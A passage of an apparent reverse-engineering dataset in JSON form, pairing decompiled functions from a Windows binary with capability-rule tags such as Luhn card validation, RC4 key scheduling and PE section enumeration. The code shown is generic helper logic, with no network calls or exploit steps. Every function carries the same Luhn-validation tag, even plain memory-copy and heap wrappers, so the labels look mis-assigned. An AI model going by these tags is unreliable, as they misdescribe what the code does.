*(arg_8h + 0x14) = 3;\n                        return pcVar3;\n                    }\n                    if ((cVar1 == '-') || (('/' < cVar1 && (cVar1 < ':')))) {\n                        pcVar3 = fcn.00402f82(arg_8h, pcVar3);\n                        *(arg_8h + 0x14) = 2;\n                        return pcVar3;\n                    }\n                    if (cVar1 == '[') {\n                        pcVar3 = fcn.004032cf(arg_8h, pcVar3);\n                        *(arg_8h + 0x14) = 4;\n                        return pcVar3;\n                    }\n                    if (cVar1 == '{') {\n                        pcVar3 = fcn.004033a9(arg_8h, pcVar3);\n                        *(arg_8h + 0x14) = 5;\n                        return pcVar3;\n                    }\n                    return NULL;\n                }\n                *(arg_8h + 0x20) = 1;\n            }\n            pcVar3 = fcn.00402f42();\n            *(arg_8h + 0x14) = 0;\n        }\n    }\n    return pcVar3;\n}\n",
        "token_count": 670
    },
    "0040364d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.0040364d(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    int32_t *unaff_EDI;\n    \n    arg_8h = fcn.00402b11();\n    if ((arg_8h != 0) && (iVar1 = fcn.004034f3(arg_8h, param_1, &stack0x00000008),  iVar1 != 0)) {\n        if (unaff_EDI == NULL) {\n            return arg_8h;\n        }\n        *unaff_EDI = iVar1 - param_1;\n        return arg_8h;\n    }\n    fcn.00402bc0();\n    return 0;\n}\n",
        "token_count": 166
    },
    "004038a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004038a3(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *unaff_EBX;\n    uint n;\n    \n    uVar3 = arg_8h;\n    if (arg_8h < unaff_EBX[1]) {\n        do {\n            *(*unaff_EBX + uVar3 * 4) = 0;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < unaff_EBX[1]);\n        unaff_EBX[1] = arg_8h;\n    }\n    else {\n        uVar3 = unaff_EBX[2];\n        if (uVar3 < arg_8h) {\n            iVar2 = fcn.00406c7f();\n            iVar1 = *unaff_EBX;\n            if (iVar2 == 0) {\n                fcn.004043b8();\n                fcn.00406d25();\n            }\n            sub.ntdll.dll_memcpy(iVar2, iVar1, uVar3 << 2);\n            fcn.004043b8();\n            fcn.00406d25();\n            *unaff_EBX = iVar2;\n            unaff_EBX[2] = arg_8h;\n        }\n        for (uVar3 = unaff_EBX[1]; uVar3 < arg_8h; uVar3 = uVar3 + 1) {\n            *(*unaff_EBX + uVar3 * 4) = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 355
    },
    "00403e10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e10(uint32_t *param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        param_2 = param_2 - param_1;\n        param_3 = param_3 - param_1;\n        do {\n            uVar2 = *(param_2 + param_1) + uVar1;\n            *param_1 = uVar2;\n            uVar1 = uVar2 < uVar1;\n            *param_1 = *param_1 + *(param_3 + param_1);\n            if (*param_1 < *(param_3 + param_1)) {\n                uVar1 = uVar1 + 1;\n            }\n            param_1 = param_1 + 1;\n            in_EAX = in_EAX + -1;\n        } while (in_EAX != 0);\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "00403e49": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403e49(uint arg_8h, uint32_t arg_ch)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    uint *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint32_t *puVar4;\n    uint32_t var_1ch;\n    uint32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t *var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = arg_ch * 2;\n    puVar3 = in_ECX;\n    if (iVar2 != 0) {\n        for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *puVar3 = 0;\n            puVar3 = puVar3 + 1;\n        }\n    }\n    if (arg_ch != 0) {\n        iVar2 = in_ECX - in_EAX;\n        var_14h = arg_ch;\n        var_8h = in_ECX + arg_ch;\n        do {\n            uVar1 = 0;\n            if (*in_EAX != 0) {\n                var_10h = 0;\n                var_4h = 0;\n                puVar4 = iVar2 + in_EAX;\n                do {\n                    fcn.00403bfe();\n                    if (var_1ch + var_10h < var_10h) {\n                        var_18h = var_18h + 1;\n                    }\n                    var_1ch = var_1ch + var_10h + *puVar4;\n                    if (var_1ch < *puVar4) {\n                        var_18h = var_18h + 1;\n                    }\n                    var_4h = var_4h + 1;\n                    *puVar4 = var_1ch;\n                    var_10h = var_18h;\n                    puVar4 = puVar4 + 1;\n                    uVar1 = var_18h;\n                } while (var_4h < arg_ch);\n            }\n            in_EAX = in_EAX + 1;\n            var_14h = var_14h - 1;\n            *var_8h = uVar1;\n            var_8h = var_8h + 1;\n        } while (var_14h != 0);\n    }\n    return 0;\n}\n",
        "token_count": 542
    },
    "00403ee7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403ee7(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = 0;\n    if (arg_10h != 0) {\n        var_4h = in_ECX;\n        if (in_ECX != 0) {\n            do {\n                fcn.00403bfe();\n                *in_EAX = *in_EAX - iVar1;\n                uVar2 = -iVar1 - 1U < *in_EAX;\n                *in_EAX = *in_EAX - var_10h;\n                if (-var_10h - 1U <= *in_EAX && *in_EAX != -var_10h - 1U) {\n                    uVar2 = uVar2 + 1;\n                }\n                iVar1 = uVar2 + var_ch;\n                in_EAX = in_EAX + 1;\n                var_4h = var_4h + -1;\n            } while (var_4h != 0);\n        }\n        arg_8h = arg_8h - iVar1;\n    }\n    return arg_8h;\n}\n",
        "token_count": 321
    },
    "004043a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043a4(int32_t param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    \n    if (param_2 != 0) {\n        param_1 = param_1 - in_EAX;\n        do {\n            *in_EAX = *(param_1 + in_EAX);\n            in_EAX = in_EAX + 1;\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00404608": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404608(uint arg_8h, int32_t arg_ch)\n\n{\n    uint32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (arg_ch == 0) {\n        if (in_ECX != 0) {\n            for (; in_ECX != 0; in_ECX = in_ECX + -1) {\n                *in_EAX = 0;\n                in_EAX = in_EAX + 1;\n            }\n        }\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 0;\n        var_4h = in_ECX;\n        if (in_ECX != 0) {\n            do {\n                fcn.00403bfe();\n                *in_EAX = var_10h + uVar1;\n                if (var_10h + uVar1 < uVar1) {\n                    var_ch = var_ch + 1;\n                }\n                in_EAX = in_EAX + 1;\n                var_4h = var_4h + -1;\n                uVar1 = var_ch;\n            } while (var_4h != 0);\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 306
    },
    "004047bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004047bd(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint in_EAX;\n    int32_t arg_8h_00;\n    int32_t iVar1;\n    uint unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00403bd8();\n    iVar1 = fcn.00403bd8();\n    fcn.00403f7c(arg_8h_00, arg_ch, unaff_ESI, arg_10h, in_EAX);\n    fcn.004043a4();\n    if (iVar1 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    if (arg_8h_00 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    return 0;\n}\n",
        "token_count": 211
    },
    "00404833": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404833(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    int32_t arg_ch_00;\n    uint var_4h;\n    \n    arg_ch_00 = fcn.00403bd8();\n    fcn.00403e49(arg_ch, in_EAX);\n    fcn.004047bd(arg_8h, arg_ch_00, arg_14h);\n    if (arg_ch_00 != 0) {\n        fcn.004043b8();\n    }\n    fcn.00403bed();\n    return 0;\n}\n",
        "token_count": 144
    },
    "00404fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00404fcc(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    bool bVar3;\n    \n    bVar3 = false;\n    cVar1 = fcn.00408dd4(param_1);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00408dfb(param_2, 0x40);\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.00406231(param_1, unaff_EDI << 3, 0, param_2);\n            bVar3 = iVar2 == 0;\n        }\n    }\n    return bVar3;\n}\n",
        "token_count": 165
    },
    "004058b1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004058b1(uint *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint *arg_28h)\n\n{\n    int32_t iVar1;\n    uint *unaff_EBX;\n    uint *puVar2;\n    uint *puVar3;\n    ulong uVar4;\n    \n    puVar2 = 0x411fc0;\n    puVar3 = unaff_EBX;\n    for (iVar1 = 0x1e; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar3 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    puVar2 = unaff_EBX + 0x1e;\n    for (iVar1 = 0x10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_8h;\n        arg_8h = arg_8h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    uVar4 = fcn.0040589d(arg_ch);\n    unaff_EBX[0x2e] = uVar4;\n    unaff_EBX[0x2f] = uVar4 >> 0x20;\n    uVar4 = fcn.00405846(arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h);\n    unaff_EBX[0x30] = uVar4;\n    unaff_EBX[0x31] = uVar4 >> 0x20;\n    puVar2 = unaff_EBX + 0x32;\n    for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = *arg_28h;\n        arg_28h = arg_28h + 1;\n        puVar2 = puVar2 + 1;\n    }\n    return;\n}\n",
        "token_count": 483
    },
    "0040591e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.0040591e(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, uint32_t arg_1ch, \n            uint arg_20h, int32_t arg_24h, int32_t arg_28h)\n\n{\n    uint32_t in_EAX;\n    int32_t iVar1;\n    uint32_t in_ECX;\n    uint var_2cch;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0xf;\n    }\n    else if (arg_28h == 0) {\n        arg_8h = 10;\n    }\n    else if (in_ECX < 0x100) {\n        if (in_EAX < 0x100) {\n            if (arg_10h < 0x100) {\n                if (arg_1ch < 0x1001) {\n                    if (arg_24h - 1U < 0x200) {\n                        if (arg_ch == 0) {\n                            arg_8h = 0xd;\n                        }\n                        else {\n                            fcn.004058b1(arg_ch, arg_14h, in_ECX, in_EAX, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n                            if (*0x434c3c != NULL) {\n                                (**0x434c3c)(arg_8h, 0x411fc0, arg_ch, arg_10h, arg_14h);\n                            }\n                            iVar1 = fcn.00406c7f();\n                            if (iVar1 != 0) {\n                                arg_8h = fcn.004057ad(arg_8h, in_ECX);\n                                fcn.00406d25();\n                            }\n                        }\n                    }\n                    else {\n                        arg_8h = 2;\n                    }\n                }\n                else {\n                    arg_8h = 0xc;\n                }\n            }\n            else {\n                arg_8h = 0xb;\n            }\n        }\n        else {\n            arg_8h = 0x10;\n        }\n    }\n    else {\n        arg_8h = 0x11;\n    }\n    return arg_8h;\n}\n",
        "token_count": 508
    },
    "00405c15": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00405c15(uint param_1)\n\n{\n    uint *unaff_ESI;\n    uint32_t unaff_EDI;\n    uint uStackY8;\n    \n    if (unaff_ESI == NULL) {\n        uStackY8 = 3;\n    }\n    else {\n        fcn.00405a4f(param_1);\n        sub.ntdll.dll_memset();\n        unaff_ESI[0x5a] = 0;\n        *unaff_ESI = 0x200;\n        unaff_ESI[0x5b] = 0x40;\n        if (unaff_EDI < 0x100) {\n            *0x434c3c = 0;\n            unaff_ESI[0x43] = 1;\n            unaff_ESI[0x5d] = 1;\n            unaff_ESI[0x5c] = unaff_EDI;\n            return 0;\n        }\n        uStackY8 = 0x11;\n    }\n    return uStackY8;\n}\n",
        "token_count": 232
    },
    "00405fd8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00405fd8(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *unaff_ESI;\n    uchar *puVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00407c1d(0x412048, 0x10, 0x1cd7a7ee);\n    if (unaff_ESI == NULL) {\n        uVar2 = 3;\n    }\n    else {\n        if (0 < *unaff_ESI + 7 + (*unaff_ESI + 7 >> 0x1f & 7U) >> 3) {\n            piVar3 = unaff_ESI + 2;\n            puVar4 = unaff_ESI + 0x89;\n            do {\n                puVar4[-1] = *((*piVar3 >> 4) + iVar1);\n                *puVar4 = *((*piVar3 & 0xf) + iVar1);\n                piVar3 = piVar3 + 1;\n                puVar4 = puVar4 + 2;\n            } while ((-8 - unaff_ESI) + piVar3 < *unaff_ESI + 7 + (*unaff_ESI + 7 >> 0x1f & 7U) >> 3);\n        }\n        *((*unaff_ESI + 3 + (*unaff_ESI + 3 >> 0x1f & 3U) >> 2) + 0x88 + unaff_ESI) = 0;\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 374
    },
    "004061e3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004061e3(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00406c7f();\n    if (iVar1 != 0) {\n        iVar1 = fcn.00405c15();\n        if (iVar1 == 0) {\n            iVar1 = fcn.00405eb7(arg_8h, arg_ch, arg_10h);\n            if (iVar1 == 0) {\n                fcn.0040613e(arg_18h);\n            }\n        }\n        fcn.00406d25();\n    }\n    return 0;\n}\n",
        "token_count": 161
    },
    "00406231": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00406231(uint param_1, uint param_2, uint param_3, uint param_4, uint param_5)\n\n{\n    uint arg_14h;\n    \n    arg_14h = fcn.00405a49(param_5, param_1);\n    fcn.004061e3(param_2, param_3, param_4, arg_14h, param_5);\n    return;\n}\n",
        "token_count": 99
    },
    "004062b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004062b2(int32_t arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    char *in_EAX;\n    uint16_t uVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    uVar3 = 0;\n    _auStack8 = 0;\n    *(in_EAX + 0x100) = 0;\n    pcVar4 = in_EAX;\n    do {\n        *pcVar4 = uVar3;\n        uVar3 = uVar3 + 1;\n        pcVar4 = pcVar4 + 1;\n    } while (uVar3 < 0x100);\n    iVar5 = 0x100;\n    pcVar4 = in_EAX;\n    do {\n        cVar1 = *pcVar4;\n        uVar2 = auStack8[2] + *(var_1h + arg_8h) + cVar1;\n        _auStack8 = var_1h + 1 << 0x18;\n        *pcVar4 = in_EAX[uVar2];\n        in_EAX[uVar2] = cVar1;\n        if (var_1h + 1 == arg_ch) {\n            _auStack8 = 0;\n        }\n        _auStack8 = (CONCAT11(var_1h, uVar2) & 0xff) << 0x10 | _auStack8;\n        pcVar4 = pcVar4 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return;\n}\n",
        "token_count": 401
    },
    "00406390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406390(uint arg_8h, uint32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_104h;\n    \n    cVar1 = fcn.00408dd4(arg_8h, arg_ch & 0xffff);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00408dd4(arg_10h, arg_14h);\n        if (cVar1 != '\\0') {\n            if (in_EAX == 0) {\n                in_EAX = arg_10h;\n            }\n            cVar1 = fcn.00408dfb(in_EAX, arg_14h);\n            if (cVar1 != '\\0') {\n                fcn.004062b2(arg_8h, arg_ch);\n                fcn.00406313(arg_10h);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 220
    },
    "00406646": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00406646(void)\n\n{\n    char cVar1;\n    int16_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int16_t *piVar4;\n    uint uVar5;\n    uint var_410h;\n    uint var_208h;\n    \n    uVar5 = 0;\n    fcn.00408e22(0);\n    cVar1 = fcn.00408e22();\n    if (cVar1 == '\\0') {\n        in_EAX = NULL;\n    }\n    iVar2 = (**0x413448)(0x104, &var_410h);\n    if (iVar2 != 0) {\n        uVar3 = fcn.00407c34(0x41205c, 3, 0xe35d2da4);\n        iVar2 = (**0x413480)(&var_410h, uVar3, 0, &var_208h);\n        if (iVar2 != 0) {\n            fcn.0040677b();\n            if (in_EAX != NULL) {\n                iVar2 = (**0x4133a4)(&var_208h);\n                for (piVar4 = &var_208h + iVar2 * 2; *piVar4 != 0x2e; piVar4 = piVar4 + -1) {\n                }\n                if (*in_EAX != 0x2e) {\n                    piVar4 = piVar4 + 1;\n                }\n                (**0x413390)(piVar4, in_EAX);\n            }\n            uVar5 = fcn.00407c4b();\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 372
    },
    "0040686e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040686e(uint16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    \n    if (param_1 != in_EAX) {\n        uVar1 = *param_1;\n        puVar5 = param_1 + 1;\n        while (uVar1 != 0) {\n            uVar2 = *in_EAX;\n            in_EAX = in_EAX + 1;\n            if (uVar1 != uVar2) {\n                uVar3 = uVar1;\n                uVar4 = uVar2;\n                if (uVar1 < uVar2) {\n                    uVar4 = puVar5[-1];\n                    uVar3 = uVar2;\n                }\n                if (uVar3 - uVar4 != 0x20) {\n                    return 1;\n                }\n            }\n            uVar1 = *puVar5;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 260
    },
    "00406959": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00406959(uint param_1)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    \n    iVar1 = fcn.00406949();\n    sub.ntdll.dll_memcpy(param_1, extraout_ECX, iVar1 + 1);\n    return param_1;\n}\n",
        "token_count": 68
    },
    "00406beb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00406beb(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = param_1;\n    in_EAX[1] = -0x54454546;\n    *(in_EAX + param_1 + 8) = 0xabbababa;\n    return in_EAX + 2;\n}\n",
        "token_count": 87
    },
    "00406bfd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00406bfd(uint32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EDI;\n    uint var_4h;\n    \n    uVar2 = (**0x4133c8)();\n    cVar1 = fcn.00406adf(uVar2);\n    if (cVar1 == '\\0') {\n        fcn.00406b9d();\n    }\n    iVar5 = 0;\n    if (unaff_EDI != 0) {\n        iVar3 = fcn.00406ab7(unaff_EDI + 2);\n        iVar4 = (**0x413454)(*0x4335f4, arg_8h, iVar3 + 0xc);\n        if (iVar4 != 0) {\n            iVar5 = fcn.00406beb();\n            if ((arg_8h & 8) == 0) {\n                sub.ntdll.dll_memset(iVar5 + unaff_EDI, 0, iVar3 - unaff_EDI);\n            }\n            if (iVar5 != 0) {\n                (**0x413460)(uVar2);\n            }\n        }\n    }\n    return iVar5;\n}\n",
        "token_count": 304
    },
    "00406c8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00406c8c(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t unaff_EDI;\n    uint var_4h;\n    \n    uVar2 = (**0x4133c8)();\n    cVar1 = fcn.00406adf();\n    if (cVar1 == '\\0') {\n        fcn.00406b9d();\n    }\n    iVar7 = 0;\n    iVar6 = iVar7;\n    if (in_EAX == 0) goto code_r0x00406d16;\n    uVar3 = fcn.00406ab7(in_EAX + 2);\n    if (unaff_EDI == 0) {\ncode_r0x00406cf7:\n        iVar5 = (**0x413454)(*0x4335f4, 8, uVar3 + 0xc);\n    }\n    else {\n        cVar1 = fcn.00406af1(unaff_EDI);\n        if ((cVar1 == '\\0') || (uVar4 = fcn.00406c88(),  iVar6 = unaff_EDI,  uVar3 <= uVar4)) goto code_r0x00406d16;\n        if (unaff_EDI + -8 == 0) goto code_r0x00406cf7;\n        iVar5 = (**0x413450)(*0x4335f4, 8, unaff_EDI + -8, uVar3 + 0xc);\n    }\n    iVar6 = iVar7;\n    if (iVar5 != 0) {\n        iVar6 = fcn.00406beb();\n    }\ncode_r0x00406d16:\n    (**0x413460)(uVar2);\n    return iVar6;\n}\n",
        "token_count": 431
    },
    "00406d6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406d6b(void)\n\n{\n    char cVar1;\n    uint in_EAX;\n    uint uVar2;\n    \n    cVar1 = fcn.00406adf();\n    if (cVar1 != '\\0') {\n        uVar2 = (**0x4133c8)();\n        cVar1 = fcn.00406af1(in_EAX);\n        if (cVar1 != '\\0') {\n            sub.ntdll.dll_memset();\n            fcn.00406d25();\n        }\n        (**0x413460)(uVar2);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "0040780a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407878)\n\nint32_t __cdecl fcn.0040780a(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t arg_10h;\n    uint var_4h;\n    \n    arg_10h = 0;\n    cVar1 = fcn.00408e49(arg_8h);\n    if (((cVar1 != '\\0') &&\n        (((in_EAX != 0 || (in_EAX = (**0x4133a4)(arg_8h),  in_EAX != 0)) &&\n         (iVar2 = fcn.00407742(arg_8h, 0),  iVar2 != 0)))) && (arg_10h = fcn.00406c7f(),  arg_10h != 0)) {\n        iVar2 = fcn.004077b9(arg_8h, in_EAX, arg_10h);\n        if (iVar2 == 0) {\n            fcn.00406d25();\n            arg_10h = 0;\n        }\n        else {\n            *(iVar2 + arg_10h) = 0;\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 282
    },
    "00407890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407890(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    cVar1 = fcn.00408e75(arg_8h);\n    if (cVar1 != '\\0') {\n        if (in_EAX == 0) {\n            iVar2 = (**0x4133a8)(arg_8h);\n            in_EAX = iVar2 + 1;\n        }\n        cVar1 = fcn.00408dfb(arg_10h, in_EAX * 2);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.00407781(0x4e3, arg_8h, in_EAX);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 205
    },
    "004078ea": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004078ea(uint arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t arg_10h;\n    \n    arg_10h = 0;\n    cVar1 = fcn.00408e9c(arg_8h);\n    if ((((cVar1 != '\\0') && (iVar2 = (**0x4133a8)(arg_8h),  iVar2 != 0)) &&\n        (iVar3 = fcn.00407781(0x4e3, arg_8h, 0),  iVar3 != 0)) && (arg_10h = fcn.00406c7f(),  arg_10h != 0)) {\n        iVar2 = fcn.00407890(arg_8h, iVar2, arg_10h);\n        if (iVar2 == 0) {\n            fcn.00406d25();\n            arg_10h = 0;\n        }\n        else {\n            if (arg_ch != NULL) {\n                *arg_ch = iVar2;\n            }\n            *(arg_10h + iVar2 * 2) = 0;\n        }\n    }\n    return arg_10h;\n}\n",
        "token_count": 282
    },
    "004079a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004079a5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    uVar3 = 0;\n    cVar1 = fcn.00408e75(arg_8h);\n    if (cVar1 != '\\0') {\n        if (in_EAX == 0) {\n            iVar2 = (**0x4133a8)(arg_8h);\n            in_EAX = iVar2 + 1;\n        }\n        cVar1 = fcn.00408dfb(arg_10h, in_EAX * 2);\n        if (cVar1 != '\\0') {\n            uVar3 = fcn.00407781(0xfde9, arg_8h, in_EAX);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 205
    },
    "004079ff": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
